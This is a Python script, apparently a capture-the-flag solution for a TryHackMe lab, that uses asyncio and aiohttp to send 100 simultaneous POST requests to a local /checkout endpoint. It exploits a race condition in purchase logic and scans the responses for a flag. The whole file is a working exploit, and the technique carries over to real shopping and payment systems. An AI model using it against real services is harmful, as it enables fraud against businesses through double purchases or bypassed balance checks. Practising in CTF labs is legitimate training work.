#!/usr/bin/env python3
# Asyncio-based Race Condition Exploit
# Uses non-blocking HTTP for maximum concurrency
# Often 2-5x faster than threading on I/O-bound targets

import asyncio
import aiohttp
import sys

URL = "http://localhost:5000/checkout"
ITEM_ID = int(sys.argv[1]) if len(sys.argv) > 1 else 1
CONCURRENT_REQUESTS = 100

payload = {"item_id": ITEM_ID}

async def exploit(session):
    try:
        async with session.post(URL, json=payload) as resp:
            text = await resp.text()
            if "Flag" in text or "THM" in text:
                print(f"[!] FLAG CAPTURED: {text.strip()}")
                return text
    except:
        pass
    return None

async def main():
    print(f"[*] Launching {CONCURRENT_REQUESTS} concurrent requests against item {ITEM_ID}")
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        tasks = [exploit(session) for _ in range(CONCURRENT_REQUESTS)]
        results = await asyncio.gather(*tasks)
        
        flags = [r for r in results if r]
        if flags:
            print("\n[+] Success! Flags obtained.")
        else:
            print("[-] No flag captured â€” try increasing concurrency")

if __name__ == "__main__":
    asyncio.run(main())
